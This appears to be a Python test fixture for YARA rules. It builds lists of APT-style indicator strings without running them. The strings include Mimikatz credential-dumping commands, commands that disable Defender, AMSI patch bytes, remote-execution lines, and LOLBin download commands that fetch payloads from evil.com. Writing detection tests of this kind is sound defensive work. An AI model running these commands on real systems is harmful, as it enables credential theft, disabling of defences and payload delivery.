"""
YARA test case - APT-style behavioral patterns
Demonstrates advanced persistent threat techniques
"""

import os
import socket
import threading
import time

class APTBehaviorSimulator:
    """Simulates APT-style behaviors that YARA detects through patterns"""

    def __init__(self):
        self.c2_domains = [
            "update.legitimate-site.com",
            "cdn.trusted-service.net",
            "api.normal-looking.io"
        ]
        self.persistence_achieved = False

    def establish_persistence(self):
        """Multiple persistence mechanisms (APT characteristic)"""

        # Pattern 1: Registry persistence
        registry_keys = [
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            "SOFTWARE\\Classes\\CLSID\\{E27CDF01-34C4-4B29-A0D9-6A1B3F3E8420}",
            "SOFTWARE\\Classes\\Folder\\shell\\open\\command"
        ]

        # Pattern 2: Scheduled task creation
        schtask_cmd = 'schtasks /create /tn "GoogleUpdateTaskMachineCore" /tr'

        # Pattern 3: WMI event subscription
        wmi_subscription = """
        SELECT * FROM __InstanceModificationEvent WITHIN 60
        WHERE TargetInstance ISA 'Win32_LocalTime'
        """

        # Pattern 4: Service creation with legitimate-looking name
        service_names = [
            "Windows Defender Update Service",
            "Microsoft .NET Framework Optimization",
            "Windows Security Health Service"
        ]

        self.persistence_achieved = True
        return "Persistence established"

    def perform_discovery(self):
        """System and network discovery (APT reconnaissance)"""

        # Pattern 1: System discovery commands
        discovery_commands = [
            "systeminfo",
            "net view /domain",
            "net group \"domain admins\" /domain",
            "nltest /domain_trusts",
            "Get-ADComputer -Filter *",
            "Get-NetComputer",
            "Get-NetUser"
        ]

        # Pattern 2: Network scanning patterns
        scan_patterns = [
            "nmap -sS -p 445,3389,22",
            "masscan -p1-65535",
            "ping -n 1"
        ]

        # Pattern 3: Process enumeration
        process_discovery = [
            "tasklist /v",
            "Get-Process",
            "ps aux"
        ]

        return discovery_commands

    def lateral_movement_preparation(self):
        """Prepare for lateral movement (APT technique)"""

        # Pattern 1: Credential harvesting setup
        credential_tools = [
            "sekurlsa::logonpasswords",
            "privilege::debug",
            "lsadump::sam",
            "hashdump"
        ]

        # Pattern 2: Remote execution tools
        remote_exec = [
            "psexec \\\\{target} -s cmd.exe",
            "wmic /node:{target} process call create",
            "Enter-PSSession -ComputerName {target}",
            "ssh -o StrictHostKeyChecking=no root@{target}"
        ]

        # Pattern 3: Pass-the-hash indicators
        pth_patterns = [
            "Invoke-WMIExec",
            "Invoke-SMBExec",
            "Invoke-PSExec"
        ]

        return remote_exec

    def data_staging(self):
        """Stage data for exfiltration (APT behavior)"""

        # Pattern 1: Create staging directories
        staging_paths = [
            "\\AppData\\Local\\Temp\\~tmp",
            "\\ProgramData\\Microsoft\\DeviceSync",
            "$env:TEMP\\.cache"
        ]

        # Pattern 2: Archive creation with encryption
        archive_commands = [
            "7z.exe a -p{password} -mhe output.7z",
            "rar.exe a -hp{password} output.rar",
            "zip -e -P {password} output.zip"
        ]

        # Pattern 3: File collection patterns
        collection_patterns = [
            "Get-ChildItem -Path C:\\ -Include *.doc,*.xls,*.pdf -Recurse",
            "Copy-Item -Path * -Destination staging -Recurse",
            "xcopy /s /e /h /i"
        ]

        return staging_paths

    def defense_evasion(self):
        """Defense evasion techniques (APT characteristic)"""

        # Pattern 1: AMSI bypass attempts
        amsi_bypass = [
            "AmsiScanBuffer",
            "amsi.dll",
            bytes([0x41, 0x6D, 0x73, 0x69]),  # 'Amsi' in bytes
            "B8 57 00 07 80 C3"  # Common AMSI patch
        ]

        # Pattern 2: ETW bypass
        etw_bypass = [
            "EtwEventWrite",
            "EtwpCreateEtwThread"
        ]

        # Pattern 3: Defender disabling
        defender_disable = [
            "Set-MpPreference -DisableRealtimeMonitoring",
            "sc stop WinDefend",
            "net stop \"Windows Defender\""
        ]

        return True

# Living off the land patterns
class LOLBinSimulator:
    """Simulate Living off the Land techniques"""

    def __init__(self):
        self.lolbins = {}

    def download_techniques(self):
        """Various download techniques using legitimate tools"""

        techniques = [
            "certutil -urlcache -split -f http://evil.com/payload.exe",
            "bitsadmin /transfer job http://evil.com/payload.exe",
            "powershell -c (New-Object Net.WebClient).DownloadFile()",
            "mshta http://evil.com/payload.hta",
            "regsvr32 /s /u /i:http://evil.com/payload.sct scrobj.dll"
        ]

        return techniques

    def execution_techniques(self):
        """Execute payloads using legitimate binaries"""

        techniques = [
            "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\"",
            "wmic process call create \"powershell -enc\"",
            "msiexec /i http://evil.com/payload.msi /quiet",
            "odbcconf /s /a {REGSVR payload.dll}",
            "pcalua -a payload.exe"
        ]

        return techniques

# Trigger YARA APT detection rules
apt_sim = APTBehaviorSimulator()
apt_sim.establish_persistence()
apt_sim.perform_discovery()

lol_sim = LOLBinSimulator()
lol_sim.download_techniques()